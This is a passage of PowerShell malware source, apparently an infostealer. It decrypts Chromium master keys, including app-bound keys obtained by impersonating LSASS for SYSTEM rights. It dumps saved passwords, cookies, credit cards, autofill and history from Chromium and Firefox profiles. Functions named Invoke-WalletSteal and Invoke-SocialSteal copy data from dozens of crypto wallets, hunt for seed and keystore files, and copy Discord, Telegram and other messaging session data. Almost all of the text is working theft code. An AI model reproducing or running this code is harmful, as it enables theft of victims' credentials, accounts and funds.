                    Write-DebugLog "Successfully extracted master key using simplified method for $BrowserName"
                }
            } catch {
                Write-DebugLog "Simplified method failed for $BrowserName`: $($_.Exception.Message)"
            }
        }
        
        # Method 3: Raw file collection if no decryption possible
        if (-not $masterKey) {
            Write-DebugLog "No master key available for $BrowserName - performing diagnostic analysis"
            $extractionMethod = "Raw Files Only"
            
            # Enhanced diagnostics: Analyze what encryption patterns exist
            try {
                $defaultProfile = Join-Path $BrowserPath "Default"
                $cookiesPath = Join-Path $defaultProfile "Network\Cookies"
                
                if (Test-Path $cookiesPath) {
                    $fileBytes = [System.IO.File]::ReadAllBytes($cookiesPath)
                    $v10Count = 0
                    $v11Count = 0
                    $v20Count = 0
                    
                    # Quick pattern scan (first 100KB for performance)
                    $scanLength = [Math]::Min(102400, $fileBytes.Length)
                    for ($i = 0; $i -lt ($scanLength - 5); $i++) {
                        if ($fileBytes[$i] -eq 0x76 -and $fileBytes[$i+1] -eq 0x31 -and $fileBytes[$i+2] -eq 0x30) {
                            $v10Count++
                        }
                        elseif ($fileBytes[$i] -eq 0x76 -and $fileBytes[$i+1] -eq 0x31 -and $fileBytes[$i+2] -eq 0x31) {
                            $v11Count++
                        }
                        elseif ($fileBytes[$i] -eq 0x76 -and $fileBytes[$i+1] -eq 0x32 -and $fileBytes[$i+2] -eq 0x30) {
                            $v20Count++
                        }
                    }
                    
                    Write-DebugLog "DIAGNOSTIC: $BrowserName encryption patterns - v10: $v10Count, v11: $v11Count, v20: $v20Count"
                    
                    if ($v20Count -gt 0) {
                        Write-DebugLog "DIAGNOSTIC: $BrowserName uses v20 app-bound encryption - requires SYSTEM privileges"
                    } elseif ($v10Count -gt 0 -or $v11Count -gt 0) {
                        Write-DebugLog "DIAGNOSTIC: $BrowserName uses legacy encryption - master key extraction issue"
                    } else {
                        Write-DebugLog "DIAGNOSTIC: $BrowserName - no encrypted patterns found (may use different encryption)"
                    }
                }
            } catch {
                Write-DebugLog "DIAGNOSTIC: Failed to analyze encryption patterns for $BrowserName`: $($_.Exception.Message)"
            }
        }
        
        # Get all browser profiles
        $profiles = Get-BrowserProfiles -BrowserPath $BrowserPath -BrowserName $BrowserName
        
        if ($profiles.Count -eq 0) {
            Write-DebugLog "No profiles found for $BrowserName"
            return $false
        }
        
        Write-DebugLog "Found $($profiles.Count) profile(s) for $BrowserName - using extraction method: $extractionMethod"
        
        $profileSuccess = 0
        foreach ($profile in $profiles) {
            try {
                $profileSuccess += Invoke-ChromiumProfileExtraction -Profile $profile -MasterKey $masterKey -BrowserOutput $browserOutput -BrowserName $BrowserName
            } catch {
                Write-DebugLog "Error processing profile $($profile.Name) for $BrowserName`: $($_.Exception.Message)"
            }
        }
        
        # Save extraction summary
        $summary = @"
Browser: $BrowserName
Extraction Method: $extractionMethod
Profiles Processed: $profileSuccess/$($profiles.Count)
Master Key Available: $($masterKey -ne $null)
Extraction Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
        $summary | Out-File (Join-Path $browserOutput "ExtractionSummary.txt") -Encoding UTF8
        
        return $profileSuccess -gt 0
    } catch {
        Write-DebugLog "Critical error in Chromium browser extraction for $BrowserName`: $($_.Exception.Message)"
        return $false
    }
}

# Enhanced Firefox browser extraction
function Invoke-FirefoxBrowserExtraction([string]$BrowserPath, [string]$BrowserName, [string]$OutputDir) {
    try {
        $browserOutput = Join-Path $OutputDir "Browsers\$BrowserName"
        New-Item -ItemType Directory -Path $browserOutput -Force | Out-Null
        
        if ($BrowserName -eq "Tor") {
            # Tor has a single profile structure
            $profiles = @(@{Name = "default"; Path = $BrowserPath})
        } else {
            # Standard Firefox structure with multiple profiles
            $profiles = @()
            if (Test-Path $BrowserPath) {
                Get-ChildItem $BrowserPath -Directory -Filter "*.default*" -ErrorAction SilentlyContinue | ForEach-Object {
                    $profiles += @{Name = $_.Name; Path = $_.FullName}
                }
            }
        }
        
        if ($profiles.Count -eq 0) {
            Write-DebugLog "No Firefox profiles found for $BrowserName"
            return $false
        }
        
        Write-DebugLog "Found $($profiles.Count) Firefox profile(s) for $BrowserName"
        
        $profileSuccess = 0
        foreach ($profile in $profiles) {
            try {
                $profileOutput = Join-Path $browserOutput $profile.Name
                New-Item -ItemType Directory -Path $profileOutput -Force | Out-Null
                
                # Extract Firefox login data
                $loginsPath = Join-Path $profile.Path "logins.json"
                if (Test-Path $loginsPath) {
                    Copy-Item $loginsPath (Join-Path $profileOutput "logins.json") -Force -ErrorAction SilentlyContinue
                    Get-Content $loginsPath -Raw -ErrorAction SilentlyContinue | Out-File (Join-Path $profileOutput "Logins.txt") -Encoding UTF8
                }
                
                # Extract cookies
                $cookiesPath = Join-Path $profile.Path "cookies.sqlite"
                if (Test-Path $cookiesPath) {
                    Copy-Item $cookiesPath (Join-Path $profileOutput "cookies_raw.sqlite") -Force -ErrorAction SilentlyContinue
                    
                    # Try to extract readable cookies
                    try {
                        $tempDb = Join-Path $T36R_TempDir "$([Guid]::NewGuid()).db"
                        [System.IO.File]::Copy($cookiesPath, $tempDb, $true)
                        
                        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
                        $conn.Open()
                        $cmd = $conn.CreateCommand()
                        $cmd.CommandText = "SELECT host, name, value FROM moz_cookies LIMIT 1000"
                        $reader = $cmd.ExecuteReader()
                        
                        $cookies = @()
                        while ($reader.Read()) {
                            $cookies += "Host: $($reader.GetString(0))`nName: $($reader.GetString(1))`nValue: $($reader.GetString(2))`n" + "=" * 30 + "`n"
                        }
                        
                        $reader.Close()
                        $conn.Close()
                        
                        if ($cookies.Count -gt 0) {
                            $cookies | Out-File (Join-Path $profileOutput "Cookies.txt") -Encoding UTF8
                        }
                        
                        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
                    } catch {
                        Write-DebugLog "Failed to extract Firefox cookies for $BrowserName`: $($_.Exception.Message)"
                    }
                }
                
                # Copy other important Firefox files
                $firefoxFiles = @("places.sqlite", "key4.db", "cert9.db", "prefs.js", "user.js", "bookmarks.html")
                foreach ($file in $firefoxFiles) {
                    $sourcePath = Join-Path $profile.Path $file
                    if (Test-Path $sourcePath) {
                        Copy-Item $sourcePath (Join-Path $profileOutput $file) -Force -ErrorAction SilentlyContinue
                    }
                }
                
                $profileSuccess++
                Write-DebugLog "Successfully processed Firefox profile: $($profile.Name)"
                
            } catch {
                Write-DebugLog "Error processing Firefox profile $($profile.Name) for $BrowserName`: $($_.Exception.Message)"
            }
        }
        
        return $profileSuccess -gt 0
    } catch {
        Write-DebugLog "Critical error in Firefox browser extraction for $BrowserName`: $($_.Exception.Message)"
        return $false
    }
}

# Get browser profiles with enhanced detection
function Get-BrowserProfiles([string]$BrowserPath, [string]$BrowserName) {
    $profiles = @()
    
    try {
        # Default profile
        $defaultPath = Join-Path $BrowserPath "Default"
        if (Test-Path $defaultPath) {
            $profiles += @{Name = "Default"; Path = $defaultPath}
        }
        
        # Numbered profiles
        Get-ChildItem $BrowserPath -Directory -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "^Profile\s*\d*$|^Guest Profile$" -or ($_.Name -match "^Person\s*\d*$" -and $BrowserName -eq "Edge")
        } | ForEach-Object {
            $profiles += @{Name = $_.Name; Path = $_.FullName}
        }
        
        Write-DebugLog "Found $($profiles.Count) profiles for $BrowserName"
        return $profiles
    } catch {
        Write-DebugLog "Error detecting profiles for $BrowserName`: $($_.Exception.Message)"
        return @()
    }
}

# Enhanced profile extraction with better error handling
function Invoke-ChromiumProfileExtraction([hashtable]$Profile, [byte[]]$MasterKey, [string]$BrowserOutput, [string]$BrowserName) {
    try {
        $profileOutput = Join-Path $BrowserOutput $Profile.Name
        New-Item -ItemType Directory -Path $profileOutput -Force | Out-Null
        
        # Database definitions with enhanced queries
        $databases = @{
            "Cookies" = @{
                Path = "Network\Cookies"
                Query = "SELECT host_key, name, encrypted_value, creation_utc, expires_utc FROM cookies ORDER BY creation_utc DESC LIMIT 2000"
                OutputFile = "Cookies.txt"
            }
            "Logins" = @{
                Path = "Login Data"
                Query = "SELECT origin_url, username_value, password_value, date_created FROM logins ORDER BY date_created DESC"
                OutputFile = "Logins.txt"
            }
            "CreditCards" = @{
                Path = "Web Data"
                Query = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
                OutputFile = "CreditCards.txt"
            }
            "Autofill" = @{
                Path = "Web Data"
                Query = "SELECT name, value, count FROM autofill ORDER BY count DESC LIMIT 500"
                OutputFile = "Autofill.txt"
            }
            "History" = @{
                Path = "History"
                Query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 2000"
                OutputFile = "History.txt"
            }
            "Downloads" = @{
                Path = "History"
                Query = "SELECT target_path, referrer, start_time, received_bytes FROM downloads ORDER BY start_time DESC LIMIT 500"
                OutputFile = "Downloads.txt"
            }
        }
        
        $successfulDatabases = 0
        foreach ($db in $databases.GetEnumerator()) {
            try {
                $dbPath = Join-Path $Profile.Path $db.Value.Path
                $outputFile = Join-Path $profileOutput $db.Value.OutputFile
                $rawFile = Join-Path $profileOutput "$($db.Key)_raw.db"
                
                if (Test-Path $dbPath) {
                    # Always copy raw database file first
                    Copy-Item $dbPath $rawFile -Force -ErrorAction SilentlyContinue
                    
                    # Try to extract data
                    if ($MasterKey) {
                        Get-ChromiumDataEnhanced -DbPath $dbPath -MasterKey $MasterKey -Query $db.Value.Query -OutFile $outputFile -DataType $db.Key
                    } else {
                        "Raw database file copied - decryption key unavailable" | Out-File $outputFile -Encoding UTF8
                        Write-DebugLog "Raw database copied for $($db.Key) - no master key"
                    }
                    
                    $successfulDatabases++
                } else {
                    Write-DebugLog "Database not found: $($db.Value.Path) in $($Profile.Name)"
                }
            } catch {
                Write-DebugLog "Error processing $($db.Key) database: $($_.Exception.Message)"
            }
        }
        
        # Copy configuration files
        $configFiles = @("Preferences", "Secure Preferences", "Bookmarks", "Extensions", "Local State")
        foreach ($configFile in $configFiles) {
            $sourcePath = Join-Path $Profile.Path $configFile
            if (Test-Path $sourcePath) {
                Copy-Item $sourcePath (Join-Path $profileOutput $configFile) -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-DebugLog "Profile $($Profile.Name) extraction completed: $successfulDatabases/6 databases processed"
        return 1
    } catch {
        Write-DebugLog "Critical error in profile extraction for $($Profile.Name): $($_.Exception.Message)"
        return 0
    }
}

# Advanced master key extraction (existing POWMI Chrome v20 logic)
function Get-AdvancedMasterKey([string]$LocalStatePath, [string]$BrowserName) {
    try {
        $localStateContent = Get-Content $LocalStatePath -Raw -Encoding UTF8
        $localStateJson = $localStateContent | ConvertFrom-Json
        
        # Try multiple key locations for different browser versions including app-bound keys
        $encKey = $null
        $isAppBound = $false
        
        # Check for app-bound encrypted key first (v20)
        if($localStateJson.os_crypt -and $localStateJson.os_crypt.app_bound_encrypted_key) {
            $encKey = $localStateJson.os_crypt.app_bound_encrypted_key
            $isAppBound = $true
            Write-DebugLog "Found app-bound encryption key for $BrowserName"
        } elseif($localStateJson.os_crypt -and $localStateJson.os_crypt.encrypted_key) {
            $encKey = $localStateJson.os_crypt.encrypted_key
            Write-DebugLog "Found standard encryption key for $BrowserName"
        } elseif($localStateJson.encrypted_key) {
            $encKey = $localStateJson.encrypted_key
            Write-DebugLog "Found root-level encryption key for $BrowserName"
        }
        
        if(-not $encKey) {
            Write-DebugLog "No encryption key found for $BrowserName"
            return $null
        }
        
        # Decode and validate the key
        $keyBytes = [Convert]::FromBase64String($encKey)
        
        if($keyBytes.Length -lt 6) {
            Write-DebugLog "Invalid encryption key length for $BrowserName"
            return $null
        }
        
        # Handle app-bound keys (v20) - use existing POWMI logic
        if($isAppBound) {
            # Check for APPB header
            $headerCheck = [Text.Encoding]::ASCII.GetString($keyBytes[0..3])
            if($headerCheck -ne "APPB") {
                Write-DebugLog "Invalid app-bound key header for $BrowserName"
                return $null
            }
            
            $keyBlobEncrypted = $keyBytes[4..($keyBytes.Length-1)]
            
            # Try SYSTEM impersonation first
            $hDup = Invoke-ImpersonateLsass
            if($hDup) {
                try {
                    $keyBlobSystemDecrypted = Unlock-Value -EncryptedBytes $keyBlobEncrypted
                    [Win32]::RevertToSelf() | Out-Null
                    [Win32]::CloseHandle($hDup) | Out-Null
                    
                    if($keyBlobSystemDecrypted) {
                        $keyBlobUserDecrypted = Unlock-Value -EncryptedBytes ([Text.Encoding]::UTF8.GetBytes($keyBlobSystemDecrypted))
                        if($keyBlobUserDecrypted) {
                            $parsed = ConvertFrom-KeyBlob -Blob ([Text.Encoding]::UTF8.GetBytes($keyBlobUserDecrypted))
                            if($parsed) {
                                $mkBytes = Get-V20MasterKey -Parsed $parsed
                                if($mkBytes) {
                                    Write-DebugLog "Successfully extracted v20 master key for $BrowserName"
                                    return $mkBytes
                                }
                            }
                        }
                    }
                } catch {
                    [Win32]::RevertToSelf() | Out-Null
                    [Win32]::CloseHandle($hDup) | Out-Null
                    Write-DebugLog "App-bound key processing failed for $BrowserName`: $($_.Exception.Message)"
                }
            }
            
            # Fallback methods for app-bound keys
            Write-DebugLog "Trying fallback methods for app-bound key in $BrowserName"
            try {
                $mk = Unlock-Value -EncryptedBytes $keyBlobEncrypted
                if($mk -and $mk.Length -gt 0) {
                    if($mk -is [string]) {
                        $mkBytes = [Text.Encoding]::UTF8.GetBytes($mk)
                    } else {
                        $mkBytes = $mk
                    }
                    
                    if($mkBytes.Length -ge 32) {
                        return $mkBytes[0..31]
                    }
                }
            } catch {
                Write-DebugLog "All app-bound fallback methods failed for $BrowserName"
            }
        } else {
            # Standard DPAPI-protected key processing
            $headerCheck = [Text.Encoding]::ASCII.GetString($keyBytes[0..4])
            
            if($headerCheck -eq "DPAPI") {
                $encryptedKey = $keyBytes[5..($keyBytes.Length-1)]
            } else {
                $encryptedKey = $keyBytes
            }
            
            $mk = Unlock-Value -EncryptedBytes $encryptedKey
            if($mk -and $mk.Length -gt 0) {
                if($mk -is [string]) {
                    $mkBytes = [Text.Encoding]::UTF8.GetBytes($mk)
                } else {
                    $mkBytes = $mk
                }
                
                if($mkBytes.Length -ge 32) {
                    return $mkBytes[0..31]
                }
            }
        }
        
        return $null
    } catch {
        Write-DebugLog "Advanced master key extraction failed for $BrowserName`: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-WalletSteal($OutDir){
    Write-DebugLog "Starting comprehensive wallet extraction..."
    
    # Browser extension wallets
    $browserWallets=@{
        "MetaMask_Chrome"      ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\nkbihfbeogaeaoehlefnkodbefgpgknn"
        "MetaMask_Edge"        ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\nkbihfbeogaeaoehlefnkodbefgpgknn"
        "MetaMask_Brave"       ="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Extensions\nkbihfbeogaeaoehlefnkodbefgpgknn"
        "TrustWallet_Chrome"   ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\egjidjbpglichdcondbcbdnbeeppgdph"
        "TrustWallet_Edge"     ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\egjidjbpglichdcondbcbdnbeeppgdph"
        "Phantom_Chrome"       ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\bfnaelmomeimhlpmgjnjophhpkkoljpa"
        "Phantom_Edge"         ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\bfnaelmomeimhlpmgjnjophhpkkoljpa"
        "CoinbaseWallet_Chrome"="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\hnfanknocfeofbddgcijnmhnfnkdnaad"
        "CoinbaseWallet_Edge"  ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\hnfanknocfeofbddgcijnmhnfnkdnaad"
        "Binance_Chrome"       ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\fhbohimaelbohpjbbldcngcnapndodjp"
        "Binance_Edge"         ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\fhbohimaelbohpjbbldcngcnapndodjp"
        "Exodus_Chrome"        ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\aholpfdialjgjfhomihkjbmgjidlcdno"
        "Exodus_Edge"          ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\aholpfdialjgjfhomihkjbmgjidlcdno"
        "Ronin_Chrome"         ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\fnjhmkhhmkbjkkabndcnnogagogbneec"
        "Ronin_Edge"           ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\fnjhmkhhmkbjkkabndcnnogagogbneec"
        "Solflare_Chrome"      ="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\bhhhlbepdkbapadjdnnojkbgioiodbic"
        "Solflare_Edge"        ="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\bhhhlbepdkbapadjdnnojkbgioiodbic"
    }

    # Desktop application wallets
    $desktopWallets=@{
        "Exodus"        ="$env:APPDATA\Exodus"
        "Atomic"        ="$env:APPDATA\atomic"
        "Ethereum"      ="$env:APPDATA\Ethereum"
        "Electrum"      ="$env:APPDATA\Electrum"
        "ElectrumLTC"   ="$env:APPDATA\Electrum-LTC"
        "Jaxx"          ="$env:APPDATA\com.liberty.jaxx"
        "Coinomi"       ="$env:LOCALAPPDATA\Coinomi"
        "Guarda"        ="$env:APPDATA\Guarda"
        "MyCrypto"      ="$env:APPDATA\MyCrypto"
        "LedgerLive"    ="$env:APPDATA\Ledger Live"
        "TrezorSuite"   ="$env:APPDATA\Trezor Suite"
        "Wasabi"        ="$env:APPDATA\WalletWasabi"
        "BitcoinCore"   ="$env:APPDATA\Bitcoin"
        "LitecoinCore"  ="$env:APPDATA\Litecoin"
        "DogecoinCore"  ="$env:APPDATA\Dogecoin"
        "DashCore"      ="$env:APPDATA\DashCore"
        "ZcashCore"     ="$env:APPDATA\Zcash"
        "MoneroGUI"     ="$env:APPDATA\monero-project"
        "BitcoinGold"   ="$env:APPDATA\BitcoinGold"
        "DigiByte"      ="$env:APPDATA\DigiByte"
        "Raven"         ="$env:APPDATA\Raven"
        "Qtum"          ="$env:APPDATA\Qtum"
        "Sparrow"       ="$env:APPDATA\Sparrow"
        "BlueWallet"    ="$env:APPDATA\BlueWallet"
        "GreenWallet"   ="$env:APPDATA\GreenAddress"
        "Blockstream"   ="$env:APPDATA\Blockstream\Green"
        "Armory"        ="$env:APPDATA\Armory"
        "MultiBit"      ="$env:APPDATA\MultiBit"
        "Copay"         ="$env:APPDATA\Copay"
        "BitPay"        ="$env:APPDATA\BitPay"
        "Breadwallet"   ="$env:APPDATA\Breadwallet"
        "TokenPocket"   ="$env:APPDATA\TokenPocket"
        "SafePal"       ="$env:APPDATA\SafePal"
        "Yoroi"         ="$env:APPDATA\Yoroi"
        "Daedalus"      ="$env:APPDATA\Daedalus"
        "Nami"          ="$env:APPDATA\Nami"
        "Flint"         ="$env:APPDATA\Flint"
        "CCVault"       ="$env:APPDATA\CCVault"
        "Adalite"       ="$env:APPDATA\Adalite"
        "NuFi"          ="$env:APPDATA\NuFi"
        "Typhon"        ="$env:APPDATA\Typhon"
        "Eternl"        ="$env:APPDATA\Eternl"
        "Frame"         ="$env:APPDATA\Frame"
        "Mist"          ="$env:APPDATA\Mist"
        "Parity"        ="$env:APPDATA\Parity"
        "Geth"          ="$env:APPDATA\Ethereum\geth"
    }

    $walletFound = $false
    
    # Process browser extension wallets
    Write-DebugLog "Scanning browser extension wallets..."
    foreach($w in $browserWallets.GetEnumerator()){
        if(Test-Path $w.Value){
            $walletFound = $true
            $dest=Join-Path $OutDir "Wallets\BrowserExtensions\$($w.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try{
                Invoke-FastCopy -Source $w.Value -Destination $dest -Recurse | Out-Null
                Write-DebugLog "Copied browser wallet: $($w.Name) from $($w.Value)"
                
                # Also copy local storage and session storage
                $parentDir = Split-Path $w.Value -Parent
                $localStorage = Join-Path $parentDir "Local Storage"
                $sessionStorage = Join-Path $parentDir "Session Storage"
                
                if(Test-Path $localStorage) {
                    Invoke-FastCopy -Source $localStorage -Destination (Join-Path $dest "Local Storage") -Recurse | Out-Null
                    Write-DebugLog "Copied Local Storage for $($w.Name)"
                }
                if(Test-Path $sessionStorage) {
                    Invoke-FastCopy -Source $sessionStorage -Destination (Join-Path $dest "Session Storage") -Recurse | Out-Null
                    Write-DebugLog "Copied Session Storage for $($w.Name)"
                }
            }catch{
                Write-DebugLog "Failed to copy browser wallet $($w.Name): $($_.Exception.Message)"
            }
        }
    }
    
    # Process desktop application wallets
    Write-DebugLog "Scanning desktop wallet applications..."
    foreach($w in $desktopWallets.GetEnumerator()){
        if(Test-Path $w.Value){
            $walletFound = $true
            $dest=Join-Path $OutDir "Wallets\Desktop\$($w.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try{
                Invoke-FastCopy -Source $w.Value -Destination $dest -Recurse | Out-Null
                Write-DebugLog "Copied desktop wallet: $($w.Name) from $($w.Value)"
            }catch{
                Write-DebugLog "Failed to copy desktop wallet $($w.Name): $($_.Exception.Message)"
            }
        }
    }
    
    # Search for wallet files in common locations
    Write-DebugLog "Searching for wallet files..."
    $walletSearchPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads"
    )
    
    foreach($searchPath in $walletSearchPaths) {
        if(Test-Path $searchPath) {
            try {
                Get-ChildItem $searchPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
                    ($_.Extension -in @(".wallet", ".dat", ".json", ".key") -or $_.Name -match "keystore|seed|mnemonic|recovery") -and
                    $_.Name -match "wallet|crypto|bitcoin|ethereum|exodus|electrum|atomic"
                } | ForEach-Object {
                    $walletFound = $true
                    $dest = Join-Path $OutDir "Wallets\FoundFiles\$(Split-Path $searchPath -Leaf)"
                    New-Item -ItemType Directory -Path $dest -Force | Out-Null
                    Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Found wallet file: $($_.Name) in $searchPath"
                }
            } catch {
                Write-DebugLog "Error searching for wallet files in $searchPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Check for running wallet processes
    try {
        $walletProcesses = @(Get-Process | Where-Object {$_.ProcessName -match "exodus|atomic|electrum|jaxx|coinomi|guarda|mycrypto|ledger|trezor|wasabi|bitcoin|litecoin|dogecoin|dash|zcash|monero|sparrow|bluewallet|green"} -ErrorAction SilentlyContinue)
        if($walletProcesses -and $walletProcesses.Count -gt 0) {
            $walletFound = $true
            $processInfo = $walletProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path) - PID: $($_.Id)" }
            $processInfo | Out-File (Join-Path $OutDir "Wallets\RunningWalletProcesses.txt") -Encoding utf8
            Write-DebugLog "Found running wallet processes: $($walletProcesses.Count)"
        }
    } catch {
        Write-DebugLog "Wallet process check failed: $($_.Exception.Message)"
    }
    
    if(-not $walletFound) {
        Write-DebugLog "No wallet data found"
    }
    Write-DebugLog "Comprehensive wallet extraction completed"
}

function Invoke-DesktopWalletSteal($OutDir) {
    Write-DebugLog "Starting desktop wallet extraction..."
    $walletPaths = @{
        "Atomic" = "$env:APPDATA\atomic\Local Storage\leveldb"
        "Exodus" = "$env:APPDATA\Exodus\exodus.wallet"
        "Electrum" = "$env:APPDATA\Electrum\wallets"
        "Jaxx" = "$env:APPDATA\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
        "Coinomi" = "$env:LOCALAPPDATA\Coinomi\Coinomi\wallets"
        "Guarda" = "$env:APPDATA\Guarda\Local Storage\leveldb"
        "MyCrypto" = "$env:APPDATA\MyCrypto\Local Storage\leveldb"
        "Ledger Live" = "$env:APPDATA\Ledger Live\Local Storage\leveldb"
        "Trezor Suite" = "$env:APPDATA\Trezor Suite\Local Storage\leveldb"
        "Wasabi" = "$env:APPDATA\WalletWasabi\Client\Wallets"
        "Bitcoin Core" = "$env:APPDATA\Bitcoin\wallets"
        "Litecoin Core" = "$env:APPDATA\Litecoin\wallets"
        "Dogecoin Core" = "$env:APPDATA\Dogecoin\wallets"
        "Dash Core" = "$env:APPDATA\DashCore\wallets"
        "Zcash" = "$env:APPDATA\Zcash\wallets"
    }

    foreach ($wallet in $walletPaths.GetEnumerator()) {
        if (Test-Path $wallet.Value) {
            $destDir = Join-Path $OutDir "DesktopWallets\$($wallet.Name)"
            New-Item -ItemType Directory -Force -Path $destDir | Out-Null
            try {
                Copy-Item -Path $wallet.Value -Destination $destDir -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied desktop wallet: $($wallet.Name)"
            } catch {
                Write-DebugLog "Failed to copy desktop wallet $($wallet.Name): $($_.Exception.Message)"
            }
        }
    }
    Write-DebugLog "Desktop wallet extraction completed"
}

function Invoke-SocialSteal($OutDir){
    Write-DebugLog "Starting comprehensive social app extraction..."
    
    # Discord locations (multiple installation types)
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:APPDATA\discordcanary", 
        "$env:APPDATA\discordptb",
        "$env:LOCALAPPDATA\Discord",
        "$env:LOCALAPPDATA\DiscordCanary",
        "$env:LOCALAPPDATA\DiscordPTB"
    )
    
    # Telegram locations
    $telegramPaths = @(
        "$env:APPDATA\Telegram Desktop\tdata",
        "$env:LOCALAPPDATA\Telegram Desktop\tdata",
        "$env:USERPROFILE\AppData\Roaming\Telegram Desktop\tdata"
    )
    
    # WhatsApp locations  
    $whatsappPaths = @(
        "$env:LOCALAPPDATA\WhatsApp",
        "$env:APPDATA\WhatsApp"
    )
    
    # Signal locations
    $signalPaths = @(
        "$env:APPDATA\Signal",
        "$env:LOCALAPPDATA\Signal"
    )
    
    # Slack locations
    $slackPaths = @(
        "$env:APPDATA\Slack",
        "$env:LOCALAPPDATA\slack"
    )
    
    # Microsoft Teams locations
    $teamsPaths = @(
        "$env:APPDATA\Microsoft\Teams",
        "$env:LOCALAPPDATA\Microsoft\Teams"
    )
    
    # Skype locations
    $skypePaths = @(
        "$env:APPDATA\Skype",
        "$env:LOCALAPPDATA\Skype",
        "$env:LOCALAPPDATA\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c"
    )
    
    # Zoom locations
    $zoomPaths = @(
        "$env:APPDATA\Zoom",
        "$env:LOCALAPPDATA\Zoom"
    )
    
    # Additional social/communication apps
    $otherSocialPaths = @{
        "Element"           = "$env:APPDATA\Element"
        "Keybase"          = "$env:LOCALAPPDATA\Keybase"
        "Threema"          = "$env:LOCALAPPDATA\Threema"
        "Viber"            = "$env:APPDATA\ViberPC"
        "WeChat"           = "$env:APPDATA\Tencent\WeChat"
        "LINE"             = "$env:LOCALAPPDATA\LINE"
        "KakaoTalk"        = "$env:APPDATA\Kakao\KakaoTalk"
        "Wickr"            = "$env:LOCALAPPDATA\WickrInc"
        "Riot"             = "$env:APPDATA\Riot"
        "Mumble"           = "$env:APPDATA\Mumble"
        "Ventrilo"         = "$env:APPDATA\Ventrilo"
        "TeamSpeak3"       = "$env:APPDATA\TS3Client"
        "Briar"            = "$env:APPDATA\Briar"
        "Session"          = "$env:APPDATA\Session"
        "Jami"             = "$env:LOCALAPPDATA\GNU Ring"
        "Tox"              = "$env:APPDATA\tox"
        "Pidgin"           = "$env:APPDATA\.purple"
        "HexChat"          = "$env:APPDATA\HexChat"
        "IRCCloud"         = "$env:APPDATA\IRCCloud"
        "Mattermost"       = "$env:APPDATA\Mattermost"
        "RocketChat"       = "$env:APPDATA\Rocket.Chat"
        "Franz"            = "$env:APPDATA\Franz"
        "Rambox"           = "$env:APPDATA\Rambox"
        "Ferdi"            = "$env:APPDATA\Ferdi"
        "Ferdium"          = "$env:APPDATA\Ferdium"
        "WebCord"          = "$env:APPDATA\WebCord"
    }
    
    $socialFound = $false
    
    # Extract Discord data
    Write-DebugLog "Scanning Discord installations..."
    foreach($discordPath in $discordPaths) {
        if(Test-Path $discordPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Discord\$(Split-Path $discordPath -Leaf)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $discordPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Discord data from: $discordPath"
                
                # Also copy Local Storage and Session Storage if exists
                $parentDir = Split-Path $discordPath -Parent
                $localStorage = Join-Path $parentDir "Local Storage"
                $sessionStorage = Join-Path $parentDir "Session Storage"
                
                if(Test-Path $localStorage) {
                    Copy-Item $localStorage (Join-Path $dest "Local Storage") -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Discord Local Storage"
                }
                if(Test-Path $sessionStorage) {
                    Copy-Item $sessionStorage (Join-Path $dest "Session Storage") -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Discord Session Storage"
                }
            } catch {
                Write-DebugLog "Failed to copy Discord data from $discordPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Extract Telegram data
    Write-DebugLog "Scanning Telegram installations..."
    foreach($telegramPath in $telegramPaths) {
        if(Test-Path $telegramPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Telegram"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $telegramPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Telegram data from: $telegramPath"
            } catch {
                Write-DebugLog "Failed to copy Telegram data from $telegramPath`: $($_.Exception.Message)"
            }
            break # Only need one successful copy
        }
    }
    
    # Extract WhatsApp data
    Write-DebugLog "Scanning WhatsApp installations..."
    foreach($whatsappPath in $whatsappPaths) {
